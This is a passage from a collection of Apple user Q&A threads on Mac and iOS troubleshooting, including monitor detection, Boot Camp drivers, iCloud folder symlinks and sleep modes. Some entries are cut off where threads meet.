terms of TestFlight's scalability, you can invite up to 10,000 testers through the platform (as is listed on Apple's TestFlight web page).\n", "Q: Shortcut to rename multiple files in the Finder In the Finder, it is possible to rename the selected file by pressing the \"Enter\" key.\nWhen multiple files are selected, it is possible to batch rename them using some simple rules by right clicking on the files and then clicking \"Rename X files...\".\nIs there a shortcut to rename the files which are selected, so that one does not need to move the mouse, right click, select the rename button, etc.? \nAlthough one might expect that pressing enter when multiple files are selected would do this, pressing enter then does not seem to have this effect (it appears to do nothing).\n\nA: As I don't need so many files renamed simultaneously I simply added this few shortcuts for different numbers\n\nTo do this open Preferences > Keyboard > App Shortcuts > + and add Finder with exact Rename 2 Items... menu title and so on)\n\nThere is more complex solution via automator, which I don't like it as it resets Rename Menu state each time you open it.\n\nA: As you said, probably best way is to select files and right click. There will be an option to rename xx files, where xx is the number of files selected. I used this and it works great and fast.  It allows you to input a common part of the name that all the files will share and then you can have it add sequential numbers to distinguish the files.\n", "Q: High Sierra freezing all the time I have a Macbook Air 2014 that I updated from Yosemite to High Sierra 10.13.4 just recently, but now the laptop freezes multiple times per day :(\nHere are the things that I've tried:\n\n\n*\n\n*Upgrade softwares/browsers\n\n*Reset NVRAM\n\n*Reset SMC\n\n*Run in Safe Mode (In which Chrome completely glitches.

Thanks so much!\n\nA: I'm getting the exact same thing on my iMac. Only solution is to hold the power button and do a hard reset. I've tried Onyx, resetting the SMC and system reinstall. Using Onyx doesn't help so the frustrating solution is to live with hard powering off.\nI agree - Onyx and tools that try to \"clear all the caches\" are only a last ditch effort if you have a good backup and are willing to erase and reinstall the OS.\n\n\n*\n\n*SMC doesn't cause freezes - it causes power transition issues like sleep / wake / blowers)\n\n*PRAM saves the volume and boot options - again, not really going to help once the system is running\n\n\nNow you should do the harder fixes since they take time.\n\n\n*\n\n*verify that a brand new user account is also freezing and hanging if you just use Chrome or the one app that freezes on your main account without all your settings and other programs.\n\n*If the freezing happens in the new account or you can't isolate the freeze, then back up one last time and erase the Mac. reinstall the OS and verify the freeze is gone. Once you're sure the freeze is gone, erase and reinstall - letting Migration Assistant bring back your apps / settings / data.\n\n\nIt's super rare for the freeze to come back after that, but it can happen and then you have to do the hardest of all - pin it to a specific app or a specific set of data you need to remove from the Mac.\n", "Q: How can a process have 970% CPU usage on a dual-core computer?

Some iOS apps annoy me with push notifications that I cannot customize inside the app, so I go into iOS settings and turn off notifications entirely.\nBut I wonder, do app developers get any metrics on this?  I'd like them to be aware that their customers are turning off notifications, so maybe they could improve the app.\n\nA: They can't tell when a user has turned off notifications.  Apple doesn't share that info with developers.\nThe developer can tell if a notification was dismissed or a button was pushed.\nThose are types of notifications that you, the user, must take action on.  There's another type known as silent notifications that don't require you to take action.  These are used by Watch complications, VOIP apps, etc, and they do things like put badges on the icon.  These will be delivered to your device whether you have notifications enabled or not.  \nA developer is 'promised' by Apple that these notifications will be delivered so the developer knows if action was taken because of that (i.e. you read an email because an icon badge told you there was a new message).  \nThe best thing to do is notify the developer directly that you don't like what they're doing.  Honestly, some developers don't care and won't change.  In that case, stop using their app and find something better suited to your needs.\n", "Q: How to extend the time that a screenshot remains on screen on macOS Mojave? After taking a screenshot.

My solution:\n\n\n*\n\n*Remove the power cable from the external monitor, wait 5-10 seconds, put it back in.\n\n\nA: This might seem silly but this worked for me (also better to exhaust all options):\nI use a dock connected into the thunderbolt port. My charger connects into the dock and so does the monitor (dp to mdp cable). \nMy Dell U2715H suddenly stopped working too. I tried a bunch of different things but nothing worked. I decided to take my laptop to a service center. I just happened to remove my charger from the dock first (with the monitor still connected) and suddenly the desktop showed up on my monitor and every thing was working fine. I just connected my charger back and everything was back to normal.\n\nA: I recently experienced the same issue: a new work-issued 16-inch Macbook Pro stopped recognizing a Dell monitor connected using an HDMI cable and a multiport USB C adapter.\nI confirmed that the monitor and HDMI cable were fine by connecting them to another computer, tried two different multiport adapters (this one from StarTech and this one from Anker) in all four Thunderbolt ports (notably, all the non-HDMI ports on these adapters have consistently functioned without issue), reset the NVRAM (as suggested in Apple's troubleshooting instructions for external displays), and tried power cycling the monitor as suggested in the top answer.\nThe only thing that worked for me was:\n\n*\n\n*Unplug the monitor's HDMI cable from the multiport adapter.\n\n*Turn off the monitor (it was not necessary to unplug it).\n\n*Wait the usual 10 seconds or so.\n\n*Plug the monitor's HDMI cable back into the multiport adapter.\n\n*Wait for the MacBook's screen to briefly flash black.\n\n*Turn on the monitor.\n\nSince the first time I stumbled on this solution, the MacBook has repeatedly failed to detect the external monitor (usually a few days after the issue last occurred) and these steps have resolved the problem every time.\nOn a cantankerous note, I feel obliged to note that the prevalence of this issue (assuming a google search is representative) is disappointing given the expense and corresponding implication of quality of Apple hardware.\n\nA: Fix for me:\n\n*\n\n*Leave both MacBook and monitor connected and powered on\n\n*Wait until MacBook display turns off (can probably tweak energy settings to force)\n\n*Press a key to wake, and both displays wake up\n\nDetailed info:\n\n*\n\n*MacBook Pro (15-inch, 2017) - 2.8GHz i7\n\n*Graphics - Radeon Pro 555 2GB\n\n*Mac OS - Catalina 10.15.7\n\n*Monitor: Apple Cinema HD 23\"\n\n*USB connection - Bastch DVI>USB-C adapter\n\n\nA: Had the same problem - MacBook suddenly stopped sending signal to external display.\nMy setup:\n\n*\n\n*16'' MacBook Pro (2019)\n\n*HP U28 4K HDR Monitor connected via USB-C (with power delivery)\n\nMonitor was working perfectly for a few days, suddenly stopped working - says No signal detected.\nSolution:\nWith the monitor connected to the laptop, turn off the monitor, unplug monitor's power cable.

Hope it helps someone!\n\nA: I had same problem. Spent an hour with Apple tech support, we finally figured out I needed a USB-C to miniDisplay port dongle, not the USB-C to Thunderbolt 2 dongle I purchased with the new MacBook Pro. (Outward appearance of the miniDisplay port and the Thunderbolt 2 port are the same.) Once I had the right dongle, the monitor worked immediately.\n\nA: I had this issue for HOURS and was going crazy. Ended up the fix (for me at least) was downloading the latest video driver for Dell (my monitor is Dell), and that fixed it. So have a look and see if you can download any drivers :-)\n\nA: The same malaise hit my external monitor today.  The only crime I did was to unplug the Mac from the dock and plug it back into the dock later.  No display --after weeks of this sequence followed successfully, and new gear (one month old display, cable, docking station).\n\n\n*\n\n*MacBook Pro (15 inch, 2018)\n\n*MacOS Mojave 10.14.6\n\n*Dell 4K UltraSharp Monitor, U2718Q\n\n*Uni DisplayPort to USB C cable\n\n*CalDigit TS3 Plus with Thunderbolt 3 cable\n\n\nTroubleshooting\nI spent HOURS today trying every combination of troubleshooting under the sun.  The basic troubleshooting strategies applied were:\n\n\n*\n\n*Confirm display:  connect to another computer (worked)\n\n*Confirm display cable:  didn't have another USB C computer to connect to  (skipped)\n\n*Simplify:  eliminate everything in the chain possible, get it working then add back.  disconnected docking station, connected display directly to computer (didn't work)\n\n*Confirm computer:  reboot computer, try plugging, unplugging display into computer (didn't work)\n\n*Confirm power: I have seen references that higher resolution displays cannot be supported without direct power for your computer.  In other words computer may disable hi res displays on battery power.   So plug in your computer using its power supply. (didn't work)\n\n*Drivers/OS updates: It was a working and stable configuration for some time, with no intervening updates before it stopped working, so don't destabilize the environment by changing drivers before troubleshooting. (skipped)\n\n*Diagnostics:  Apple -> About this Mac -> System Report... -> Hardware -> Thunderbolt / Power.  EXTREMELY USEFUL.  lets you see the Mac's view of what is connected.  Before I eliminated the docking station I was able to see the CalDigit connected and supplying power, but no display connected even though the display was connected to the CalDigit.\n\n*Connection sequences:  Tried rebooting computer with display disconnected, connect display to computer directly (didn't work).  Reboot computer with display connected (didn't work).  Power cycle display while connected to computer (didn't work).\n\n*Detection:  Try having each side detect the other.  Power cycled display on boot it reported no DP device detected.  Googled to find the magical hidden Apple button to detect external displays (System Preferences -> Displays -> hold down Option button to cause magical button Detect Displays to appear), nothing detected. (didn't work)\n\n*Recent history:  Nothing changed on my computer (at least that I initiated).  The hardware I had been using for the last couple of weeks successfully (display, docking station) had no changes.\n\n*Power cables:  I know this sounds stupid, but check each point in the power chain.  The docking station has a transformer which plugs into the power strip and then the transformer plugs into the docking station.  Don't forget to check both.  Similarly the monitor has a cord with two ends, make sure both are snug.\nIn my case all the troubleshooting loosened the plug into the docking station transformer. (didn't work)\n\n\nWhat Worked\nThe aggregate of the successful answers here suggested this was a power sequencing issue.   I finally tried powering off the power strip and powering everything back on at once.  Viola!  Display popped up immediately.  At this point I was in the simplest configuration: display connected directly to laptop and no docking station.\nGiven all my troubleshooting I believe the culprit was the Mac itself.  The display and cable were working, it was the Mac that got into a state where it could not see external Thunderbolt devices.\nEpilogue\nSadly I just checked the Mac System Report and Thunderbolt still reports no devices connected to its bus ports.   But in the middle of everything it did see the docking station.   So it's not the panacea I had hoped as I can see some things correctly but not others of significance. \nCalDigit docking station after all the troubleshooting just died.  The blue LED doesn't light.  The Digital Optical port on the back which is lighted is no longer.  Either the transformer gave up the ghost, or the dock itself fried from all the connecting and reconnecting.  I love the product design and features, but I have one at work, and it's been flakey on occasion (refusing to power up like now).  \n\nA: Late entry here but it might be useful to someone so here we go.\nIf your computer has been working with an external monitor but suddenly stopped supplying an image feed\nProblem & Tinkering\nI have a late 2016 MBP 15 running Catalina 10.15.4 connected ta an Eizo CG248 via a displayport - USB C connection. It has worked without issues for over a year. Then at one point I closed my mac and turned of the screen, opening the mac up again the screen is not recognized at all. Screen is blank and turns it self off after signaling \"no input found\".\nAs I used to work in a store selling apple computers I tried all the regular tricks. Rebooting everything connecting, disconnecting, trying to force find the screen. Resetting SMC and p-ram to no avail. I did have a hyperdrive, laying around with a HDMI out. Connected it and got an image but only with 30hz refreshrate that I wasn't able to change, so it wasn't a viable option, as I need 60. The hyperdeck specs said it would provide 60hz via usb out but for some reason it did not and the HDMI cord was a 2.0 one. Tried again with 2 different display to usb c cords. And bought a mini displayport to displayport. Through the hyperdeck also got a 30hz refresh rate. Other computers in the household connected to the screen fine. But not my work computer and it was really annoying.\nI realized that there was one option I hadn't tried, if it was the hyperdeck that was resticting the HDMI i could try a HDMI - usb c cord capable of 60hz. So I got one and. I got an image.... At 30hz.\nI thought I'd try again to connect the displayport - usbc and.... It worked. What?!\nAll the glory in resolution and refreshrate was back. And it has been working since!\nSo it seems that my computer for some reason had a hangup that was cured by connecting another type of cord, but in my case not through a hyper deck. I then returned the cables I bought since I didn't need them and now I'm back to status quo with my original hardware.\nSOLUTION\nGo buy all the cord variations you can connect between your monitor and computer. Try them out one by one and retry your original connection in between. Then simply return the cords you don't need to the store again. If it works it works as It did for me. And it's free to try.\nHope you all get your image back!\n\nA: Ridiculously the solution for me, which I discovered purely out of frustration, was to use short, sharp taps (2x) on the F2 as opposed to a slow single tap which had worked previously. Now that works every time. I know it sounds ridiculous but this issue was doing my head in and that is was I accidentally discovered! very low tech solution!!\n\nA: Tired of constant reboots that always help, resetting SMC, plugging/unplugging cables, the faster solution turned out to be: \n\n\n*\n\n*Close the lid\n\n*Connect miniDP(not tested on HDMI or USB-C, but hope is the same) and attach power charger\n\n*Don't open lid until external monitor turns on by click on mouse button or press any key on external keyboard, after that you can open lid\n\n\nA: Had a similar problem MacBook Pro 2018, Belkin dock and USB-C HP monitor.\n\n\n*\n\n*go to System Preferences > Software Updates\n\n*install all pending updates\n\n*reboot\n\n\nNow it is working again.\n\nA: *\n\n*Install displaylink (https://www.synaptics.com/products/displaylink-graphics/downloads/macos)\n\n*Restart Mac & Login\n\n*Go to Launchpad\n\n*Click on \"DisplayLink Manager\" - your monitors should come on\n\n", "Q: How to use Character Viewer with only keyboard and no mouse? I'm looking for a mouseless/mouse-free solution. And I want to use the whole Character Viewer-- not just certain characters.\nI can open the Character Viewer with CTRL+CMD+SPACE, but it doesn't have focus, so it seems I have to use my mouse to select anything inside it.\nHow can I give that window keyboard focus without using my mouse?\nAnd then how can I copy characters from that window without using my mouse?\n\nA: The Character Viewer has two states, as seen below.\n\n\n*\n\n*The complex state, that needs to be clicked first and doesn't seem to allow keyboard-only activation:\n\n\n\n\n\n*The simple state, that gets automatically activated when invoked and is a joy to work with using only the keyboard.

I trade futures and other things, which requires me to be watching a number of things very closely while I'm actively considering or managing a trade.  I'd like to be more diligent about documenting all my trades, my thought processes in the moment, etc. but doing so while trading is pretty much impossible.  And trying to remember everything later is definitely impossible.  So I'd like to begin recording myself when I'm being active in the markets.\nThis is easy to do - Quicktime can do it natively even - but I would like to assign recording the screen to a keyboard shortcut so I can just fire it off in an instant when I need to, and hit another keystroke when I'm done.  This is the problem I haven't found a good solution to.\nI already own ScreenFlow, and it has a keyboard shortcut for recording.  Unfortunately Screenflow produces absolutely enormous files, that then require you to export them from Screenflow in order to actually save them somewhere.\nIdeally I'm looking for a Mac app that:\n\n\n*\n\n*Can initiate a recording of the screen (and my microphone for narration, I don't really care about camera) via a keyboard shortcut.\n\n*Produces reasonable file sizes (and to that end, allowing me to record at a greatly reduced frame rate would be great... 1 FPS even would work fine for my needs)\n\n*Outputs to standard formats, preferably .mp4 or .m4v\n\n*Works on macOS Sierra on a 2011 iMac\n\n\nRecording system audio would be an additional plus, but is not absolutely required.\nEDIT:  On exploring a bit, it turns out that Automator already has a command for New Screen Recording!  This is great, with one problem.  Quicktime opens a small window and requires you to click the little red \"Record\" button, to actually initiate recording.  I can't find any way to do this via a keyboard shortcut.  If all else fails I could applescript the click to specific coordinates, but I would love to find a \"less heavy-handed\" way to start the recording process without requiring a mouse click.  Any ideas anyone?\n\nA: Included is the source for an AppleScript droplet that can be used to transcode video files.\nYou'll need a modern installation of ffmpeg, such as the one you can get by installing HomeBrew and running \"brew ffmpeg\".\nThis conversion has not been optimized for speed, but rather for quality.\nNo deletion of source files has been included in this configuration.\nYou won't need the autocropping. You probably won't want the conversion to 6-channel AC3 audio.\nMost things you drop on this will probably end up with a greater file size after transcoding, but this will show you how a droplet for converting video might be configured. \nI've got a bunch of these, but this will process most anything you download from YouTube, I think.

Is there a way to disable it? If yes, how do I do so?\n\nA: The behaviour that you are encountering is due to an accessibility setting called Shake mouse pointer to locate.\nFirst introduced in OS X El Capitan 10.11, it helps in locating mouse pointer for people with vision disparity.

I’ve researched this issue, and I can only find answers from people using the 30” monitor. The gist is that you need to use Apple’s Mini DisplayPort to Dual-Link DVI Adapter, and then an adapter from Mini DisplayPort to USB-C.\nFrom what I can gather, the 30” monitor was the only model that used a dual-link DVI port, while the 20” and 23” used regular DVI. Reference. Is this correct?\nIf it is, it would mean I could avoid the very costly Mini DisplayPort to Dual-Link DVI Adapter, and hopefully instead purchase an Apple HDMI to DVI Adapter and an HDMI to USB-C adapter. From Apple’s description of the HDMI to DVI Adapter:\n\nUse the HDMI to DVI Adapter to connect a single-link DVI digital monitor, such as the 20-inch or 23-inch Apple Cinema Display, that includes a DVI connector.\n\nSide note: I obviously need the monitor to run at full resolution at 60hz.\n\nA: To answer my own question: The Apple HDMI to DVI Adapter + a Belkin USB-C to HDMI Adapter does indeed work for the 23”. No need for the expensive Mini DisplayPort to Dual-Link DVI Adapter. Yay!\n", "Q: Cannot see certain network directory on MacOS We have a Windows domain with a few Macs connected. They can see the network shares no problem but there are some directories where the name begins with a full stop. The Macs cannot see these for some reason.\nDoes anyone know why?\n\nA: File/Directory names beginning with . are treated as hidden in macOS and are not displayed in Finder by default.\nTo view hidden items, invoke the Finder keyboard shortcut, ⌘ + Shift + .. This key combination toggles the display of hidden items in Finder, thus re-invoking it will hide the display of hidden items.\nWhen using a Non-Apple/PC keyboard, the key equivalent to ⌘ is Window key.

I went to the App Store and they say it's because the apps from the AppStore are all 64-bit and my iPad is a 32-bit device. As a result, the seemingly simple task of downloading PDFs, saving them on my device and reading them later seems impossible.\nHow do I get PDF files onto my iPad for offline viewing?\nHere are the screenshots of what apps I already have, and what happens if I try to install iBooks.\n \n \n\nA: You don't need to install any app from the App Store to read PDF files. The stock iBooks app is sufficient to store and read PDF files in offline mode.\nYou get the PDF files in iBooks, you can open the PDF file in Safari (if it is hosted on a web-server and accessible by a URL) and copy it to iBooks app. Alternatively, you can sync PDF files from your Mac via iTunes.\nThe iBooks app for iOS is no longer compatible with iOS 5.1.1 and it is no longer possible to install it on iPad 1st generation.\nAn alternate approach to get PDFs onto the iPad to read in offline mode is to iMessage it to the device. Step by step instructions as follows:\n\n\n*\n\n*Set up iMessage on the iPad (by logging in with an Apple ID).\n\n*From another iOS/macOS device, iMessage the PDF file to the Apple ID setup on the iPad.\n\n*Once the message is received on the iPad, tap on the PDF thumbnail to download it. The PDF files gets downloaded and stored internally in the iMessage app. The same can now be accessed even without network.\n\n*To view the PDF, simply tap on the thumbnail to view it full screen.\nThe only glitch with this approach is that the last read page history is not preserved between launches. Neither are features like bookmarks and search available.\n\nA: The Apple Store answer is incorrect. The App Store still contains apps that are combined 32 bit and 64 bit, specifically to support older devices like yours.\nHowever app developers can themselves decide not to create 32 bit code for their apps anymore. That is by choice - not something forced by Apple.\nTo solve your problem just use the built-in PDF viewer or download an app that still supports 32 but devices. I would also suggest simply following the instruction you have given - namely to update the device to the latest available iOS for that device.\n\nA: I was able to transfer a PDF just now from my Mac OS 12 Mac to my iOS 5.1.1 iPad via dock-USB cable and the Finder. In a Finder window, navigate to the iPad. Click the \"Manage Storage…\" button in the upper-right of the window. A small overlay will pop up. The overlay's left sidebar will include several categories of apps-files. Select Books. Click and drag a PDF from your Mac's  filesystem into the file listing section of the overlay. The PDF should appear within your iBook's library as soon as your iPad syncs.\n", "Q: Applescript : Click at position not working \nI'm trying to click on a Chrome extension ( Google Highlight  : https://chrome.google.com/webstore/detail/multi-highlight/pfgfgjlejbbpfmcfjhdmikihihddeeji) then click on the text box and past my variables.\nhere is my code\nset NoteforGoogleCHrome to \"My text should be there\"\n\ntell application \"Google Chrome\"\n    activate\nend tell\ntell application \"System Events\"\n    tell process \"Google Chrome\"\n\n        delay 2\n        click button 8 of toolbar 2 of window \"myTab\" of application process \"Google Chrome\" of application \"System Events\"\n        delay 0.2\n        keystroke tab\n        delay 0.2\n        keystroke NoteforGoogleCHrome\n        delay 0.2\n        keystroke space\n    end tell\nend tell\n\nI tried this but this is most of the time failing.\nWhen I'm trying to click on the text field (CLICK 2) I always have an error :\n\nclick process \"Google Chrome\" at {4000, 114}      --> missing value\n\nHowever if I do the same for CLICK 1 I have no error.\nCan you give me some advice ?\n\nA: The following works for me in macOS High Sierra 10.13.5 and Google Chrome 67.0.3396.99.\nExample AppleScript code:\nset NoteforGoogleCHrome to \"click me\"\n\ntell application \"Google Chrome\" to activate\ndelay 0.5\ntell application \"System Events\"\n    click (every UI element of toolbar 2 of front window of application process \"Chrome\" whose help is \"Multi-highlight\")\n    delay 1\n    key code 48 -- # Tab Key\n    delay 0.2\n    keystroke NoteforGoogleCHrome & space\nend tell\n\nAs you can see in the image below, it highlighted all occurrences of click and me.\n\n", "Q: Installing to a home folder using a pkg I'm attempting to create a package using Packages that installs in ~/Applications (because each user can have an instance of the app in question running but it needs a custom port per user as it daemonises and runs like an HTTP server).\nI can't work out how this is done.

It apparently allows me to access a protected site as expected.\nAre there any specific privacy issues that may result from this installation? In particular, how does Safari decide when to present certificates such as mine to web sites? I'd ideally like to have a configuration where Safari ties the certificate to a particular site (or URL) and presents the certificate (i.e. attempts authentication with it) only when I visit that site. Is that possible?\n\nA: This accepted answer is wrong. It is referring to server certificates, not client authentication certificates.\nThe answer is, Safari prompts you when the web server is set to require certificate authentication.\nIn every browser I've seen, the browser will not prompt you to select a certificate if it does not have any certificates signed by a CA the server trusts. \n\nA: Safari (or any other web client) doesn't present its client certificate unless requested by the website. So your client certificate is safe. The server is always the one asking for the certificate, sending along its own certificate. Therefore, your browser will see that the certificate do not match the one you have and will result in failure, unless the server sends the right certificate to match yours, in this case, you can be sure you're on the good website.\n", "Q: Can I copy an iTunes Library from another Mac Can I copy an iTunes Library from another Mac?\nJust to be clear I am interested just in Music / Music Playlists - mostly ripped CDs or mp3 files with a couple of on-line purchases.\nMy wife ripped our joint CD collection to her Mac many years ago.

This is the process I used initially in 2011 to copy to Windows. (I may need to copy ~/Library/Preferences/com.apple.iTunes.plist)\nMy /Music/iTunes is currently ~22GB\nI do not play music on my Mac, it is used solely to synchronise to my iPhone, iPad etc.\n\nA: Not sure what you need past this article, but sure - you just need two folders worst case:\n\n\n*\n\n*https://support.apple.com/en-us/HT204318\n\n\n*\n\n*The folder where the library index and cached files exist.\n\n*The media folder if it’s not a sub folder of #1 above.\n\n\n\nYou will want to tell iTunes on the sending copmputer to reorganize all media files and copy/move them to the data folder and then run the “organize” command once or twice to be sure all the files are correct - organized and in the right folders.\nThen move the two (one) folders to the new computer and point itunes to the correct location of the library. iTunes won’t merge two libraries - so be sure you don’t expect a merge on the receiving computer.\n", "Q: Flash Player.dmg Question Quick question concerning malicious flash player.dmg files....\nI was on news sites (on the likes of CNN, BBC, etc.,) the other night when suddenly my tab automatically opened a new tab with a long string of non-sensical url, and started automatically downloading a flashplayer.dmg file to my downloads folder. I double clicked on the file to see what it was: just an image of what seemed to be the Flash Player logo. I didn’t install it, and instead after reading online that this was malware I closed the file, deleted the file, ejected it from my desktop, and cleared out my trash can.\nMy question is whether there was any harm/possible consequences in double-clicking the file? Or would I have had to actually install the file for anything bad to come out of this?\n\nA: There are occasionally programs that exploit a bug in the OS to infect your macOS without typing an admin password, and those generally are patched quickly and depend on you not having the current latest security updates installed.\nMost run of the mill software won’t cause any harm, run any code, make any changes just because you downloaded a DMG.\nIf you are super at risk of harm due to malware (human rights worker, journalist (especially one critical of the following powerful groups),  a potential target of a nation state or large corporation, or just a public figure - think globally recognized celebrity like Beyoncé) you should assume you’re compromised and seek professional help to be sure you’re secure or educated about your risk tolerance and operational security practices.\nMost people like me and my family, relatives, work colleagues that aren’t involved in super secret work - I would say if you didn’t install anything and you don’t see anything going crazy like browser redirects then you could safely trash the file and perhaps be sure Safari doesn’t open “safe” attachments and be sure your backups are set.\nIf a regular security posture user wants to check that malware was installed, I like both a scanner for known attacks and something that looks for persistent processes being hidden.\n\n\n*\n\n*https://www.malwarebytes.com/mwb-download/\n\n*https://objective-see.com/products/knockknock.html\nSo to summarize, just clicking is enough to compromise a Mac with the right malware and the right version of macOS. Even if you have a fully patched Mac - the term “zero-day” acknowledges that there are exploits that have no warning and nothing you can do to prevent them from escalating their privileges and changing your Mac without a password entered. They are rare, but do exist in practice as well as in theory.\n", "Q: iMac Bootcamp and Magic Mouse woes I've got into  a right pickle trying to get my Bluetooth Magic Mouse working with my bootcamped iMac.

However, when I tried this, I kept receiving an error saying that the Bluetooth device cannot authenticate (cannot remember the exact phraseology). I tried for days but couldn't resolve this, so eventually I resorted to booting into macOS, disconnecting and reconnecting the mouse, then booting into Windows, and voila, I can at least move and left click the mouse again. \nhowever, now I can't scroll or right click the mouse, which is a royal pain!\nAnyone know how I can my mouse properly working between Windows 10 and macOS? Do I have to just buy a separate mouse? Nuke my Windows partition and start again? Or is there a way of having this pair work nicely?\nAny help really, really appreciated. This has been a pain for months.\n\nA: Finally, I seem to have solved this!\n@BernardWei kind of lead me in the right general direction by suggesting I download the drivers from Apple again. Well, \"download\" is putting it strongly. I naturally went here to get them (which is wrong): https://support.apple.com/downloads/bootcamp\nThe downloads I was seeing on the Apple support site are Bootcamp v5.x versions. Which, according to a help article I stumbled across, aren't for Win 10, but are for earlier Windows versions (7 and the likes), which probably explains my issues when trying to use it. Please correct me if I'm wrong.\nI decided to give downloading the support software via the Bootcamp Assistant in macOS another go. I originally got the idea from here: https://support.apple.com/en-us/HT204923\nPrevious attempts had seen the software not download and give a rather ambiguous error. Turns out that I had skipped over the bit about it needing to be in a FAT32 format. I was trying to save the data onto an external harddrive which I'm guessing isn't (I haven't got it plugged in to check right now). I then tried using the only USB drive I had, which only had 1GB of space, and the Bootcamp Assistant then failed for a lack of space reason, understandably. Having family to blag a larger USB drive from is useful if you come into this situation.\nHere's the steps I took, once I had a large enough FAT32 USB drive.\n\n\n*\n\n*Boot into macOS\n\n*Open up the Bootcamp Assistant.\n\n*Go into the actions menu and select Download Windows Support Software.\n\n*Select your ready-to-go USB drive as the destination and start the download.\n\n*You may be prompted for a password. Double check what it's asking and enter it if you're comfortable.\n\n*Go and get a hot drink, this will take a little while.\n\n*Once done, reboot into Windows.\n\n*Navigate to your USB drive. Go to WindowsSupport/Bootcamp/Setup.exe and run that. \n\n*Pick repair.\n\n*Find something to do for a few minutes while the drivers on your machine are repaired. You may, like me, see multiple balloons pop up telling you that Windows is getting each one of your Bluetooth devices ready, and then again when they're done. You may also see a console Window running a disk partitioning tool. Don't worry, I think it just sets the default start up disk. I could be wrong, but nothing seems a miss yet.\n\n*Once done, you'll be prompted to restart. Do so. Your computer may try to boot to macOS, so use the options key to choose Windows as normal.\n\n*When your Windows machine restarts, your Bluetooth devices should behave themselves as expected.\n\n\nVoila!\nIt's been a long time getting here, but I'm hopeful my mouse shinanigans are over for the time being. I'll reopen this question if my mouse stops connecting again as before. But for now, this is resolved!\nEDIT: 1 day later, mouse isn't connecting again, and requires a restart into macOS to get it going. Which is back where we were at the beginning. That's fine, at least I know after a couple of restarts I'll have a fully working mouse again. \nAnother side effect of doing this was that my external harddrive that normally runs as the D drive got de-lettered, as it were. I did a small amount of panicking before coming acoss this guide which helped me discover that all my previous data wasn't gone, but just needed re-assigning a drive letter from diskmgmt.msc: https://www.makeuseof.com/tag/external-drive-not-recognized-this-is-how-to-fix-it-in-windows/\n", "Q: Sync data on external drive to iCloud I have an old iMac running macOS High Sierra 10.13.6. My internal drive was filling up, so I connected a 4 TB external drive.\nOn my internal drive, my Documents folder contained about 8 GB data. I created a Documents folder on the external drive and moved the contents from internal Documents folder to the external Documents folder, clearing up some space.\nHowever, the internal Documents folder was connected to iCloud. Is it possible to connect my external Documents folder to my iCloud account? If so, how do I do this? I know I can login to my iCloud account and create a new folder and upload files to it. Problem with that is that I have many folders in my new Documents folder, and it won't allow me to upload folders so I'm looking for a way to make the whole Documents folder attached to icloud.\n\nA: You can move the Documents folder to the external drive and create a symbolic link to Documents folder present on the external drive in your Home directory.\nFollow the steps mentioned below:\n\n\n*\n\n*Move the contents of the internal Documents directory to external Documents directory.\n\n*Rename the internal Documents directory. (You'll need to do it via Terminal by executing mv ~/Documents ~/Documents-old as Finder won't allow renaming.)\n\n*Open Terminal and create a symbolic link to the external Documents directory in your Home directory.\nln -s /Volumes/<EXTERNAL_DRIVE>/Documents ~/Documents\nNow verify that the iCloud sync is working all-right. The old internal Documents directory (which was renamed in step 2) can be safely deleted.\n", "Q: Mac Notebooks: What is the difference between Lock Screen, Turn Display Off, and Sleep mode states There are three different types of sleep states that a Mac Notebook (MacBook/MacBook Air/MacBook Pro) can go into:\n\n\n*\n\n*Lock Screen: Triggered by pressing the Lock Screen button on the Touch Bar or selecting the Lock Screen command in Apple Menu. The screen turns off after a short time and programs and videos running in the background continue running in this mode, at least for a while. However, if I have a chat program running (e.g. Slack), sometimes my messages are not updated upon waking the computer and I need to manually refresh or wait for a while.\n\n*Turn Display Off: Triggered by leaving the portable idle for a set number of minutes (as configured in System Preferences → Energy Saver). Programs and videos running in the background seem to continue running in this mode.\n\n*Sleep Mode: Triggered by pressing the Sleep button on the Touch Bar, selecting the Sleep command in Apple Menu, or closing the lid. Programs and videos running in the background turn off when the machine enters this mode.\nMy question is, what are the differences between these three modes with regards to how often programs are allowed to update in the background? Is putting my machine in Lock Screen different from waiting for the display to turn off after set duration?\n\nA: The three distinct operations do exactly as the name suggests. However, the observed behaviour may vary as these operations work in conjunction with other setting configured in System Preferences app → Energy Saver. Let's briefly survey them again, one by one:\n\n\n*\n\n*Lock Screen: Locks the screen and shows the login prompt with the name of the logged-in user displayed along with the password field. Locking the screen keeps the computer and all the processes running with the display remaining on. Any running processes continue to run, and any audio/video playback remains in progress. Lock screen invokes display sleep after a few seconds as a possible optimization technique by macOS. However, the display sleep is not performed after lock screen if video playback is in progress by a desktop app.\n\n*Turn Display Off: Only the display (built-in as well as connected) is turned off. Other hardware components remain on and processes continue to run. If a video playback is currently in progress in a desktop app (QuickTime Player, VLC etc.) the setting is overridden and the display doesn't go to sleep.\n\n*Sleep: Puts the computer into low enrgy consumption mode. The computer remains on but consumes less power. The display and hard disk are turned off, running process are halted, and any audio/video playback is paused. The advantage of this mode is that it's quicker to wake from sleep that starting from a shut down. Closing the lid of a portable automatically puts it into sleep mode unless an external display is connected to it. Sleep mode behaviour may slightly vary in case of Macs which support Power Nap. (Power Nap allows your Mac to occasionally wake from sleep to perform tasks such as checking for new email or software updates. Display and other un-needed hardware components remain turned off. Mac goes back to sleep once it's done with the task.)\n\nWhat are the differences between these three modes with regards to how often programs are allowed to update in the background?\n\nAs stated above, all the processes continue to run in the Lock Screen and Turn Display Off mode. However, depending on the configurations in System Preferences app -> Energy Saver, hard disks may be put to sleep (Hard drive motor is powered down when you aren't reading or writing files from the drive. Solid-state drives (SSDs) don’t have moving parts, so this setting doesn’t affect Mac computers that use only SSDs to store data.). Under both Lock Screen and Turn Display Off mode, all the programs continue to run and update normally.\n\nHowever, if I have a chat program running (e.g. Slack), sometimes my messages are not updated upon waking the computer and I need to manually refresh or wait for a while.\n\nThis may happen due to disruption in Internet connectivity. Display sleep and lock screen settings doesn't affect the normal operation of network applications.\n\nIs putting my machine in Lock Screen different from waiting for the display to turn off after set duration?\n\nYes. Lock Screen only restricts unauthorised access to the system and presents the logged-in users login prompt. Display turning off after a set duration doesn't automatically locks the screen or puts the system in sleep mode. A password authentication may still be required after waking the screen from display off mode if Required Password Immediately setting is enabled in System Preferences app → Security & Privacy → General.\nThe Apple support document, Use the Energy Saver settings on your Mac discusses the aforementioned items in further details.\nThe answer is written taking into account the settings and behaviour present in the current release of macOS, macOS High Sierra 10.13.6.\n", "Q: macOS: Is /etc/fstab file deprecated?

